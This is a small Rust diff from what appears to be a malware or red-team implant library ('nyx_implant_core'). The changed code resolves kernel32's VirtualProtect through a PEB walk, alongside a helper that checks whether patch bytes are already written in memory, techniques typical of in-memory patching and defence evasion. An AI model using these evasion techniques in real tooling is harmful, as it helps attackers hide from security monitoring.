@@ -68,7 +68,7 @@ type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u3
 /// Resolve kernel32!VirtualProtect via the PEB walk.
 unsafe fn vp() -> Option<VirtualProtect> {
     let a = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")?;
-    Some(core::mem::transmute(a))
+    Some(core::mem::transmute::<usize, VirtualProtect>(a))
 }
 
 /// Are the first `patch.len()` bytes at `addr` already equal to `patch`?
